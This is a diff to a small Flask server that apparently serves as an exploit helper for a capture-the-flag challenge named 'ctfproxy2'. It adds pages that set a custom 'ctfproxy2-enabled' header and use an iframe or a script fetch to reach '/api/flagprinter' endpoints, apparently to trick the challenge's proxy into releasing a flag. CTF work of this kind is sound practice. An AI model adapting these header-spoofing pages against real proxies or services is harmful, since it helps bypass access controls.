@@ -1,4 +1,4 @@
-from flask import Flask, jsonify
+from flask import Flask, jsonify, render_template, make_response
 import json
 import requests
 
@@ -42,6 +42,36 @@ def c():
     resp.headers.add('content-type', 'text/html; charset=UTF-8')
     resp.headers.add('ctfproxy2-enabled', 1)
     return resp
+@app.route('/enable/flagprinter', methods=['GET'])
+def d():
+    body='<!doctype html><html><body><iframe src=enable/flagprinter/></body></html>'
+    resp=jsonify(body)
+    resp.headers.add('content-type', 'text/html; charset=UTF-8')
+    resp.headers.add('ctfproxy2-enabled', 1)
+    return resp
+@app.route('/iframev2', methods=['GET'])
+def e():
+    body='<!doctype html><html><body><script>fetch("/api/flagprinter-v2", {headers: {"ctfproxy2-enabled":"1"}})</script><b>hi</b></body></html>'
+    resp=jsonify(body)
+    resp.headers.add('content-type', 'text/html; charset=UTF-8')
+    resp.headers.add('ctfproxy2-enabled', 1)
+    return resp
+@app.route('/iframev3', methods=['GET'])
+def f():
+    resp = make_response(render_template('template.html'))
+    print(resp)
+    print(type(resp))
+    resp.headers.add('content-type', 'text/html; charset=UTF-8')
+    resp.headers.add('ctfproxy2-enabled', '1')   
+    return resp
+
+'''
+@app.after_request
+def headers(resp):
+    resp.headers.add('content-type', 'text/html; charset=UTF-8')
+    resp.headers.add('ctfproxy2-enabled', '1')
+'''
+
 
 if __name__ == '__main__':
     app.run(port=4444)
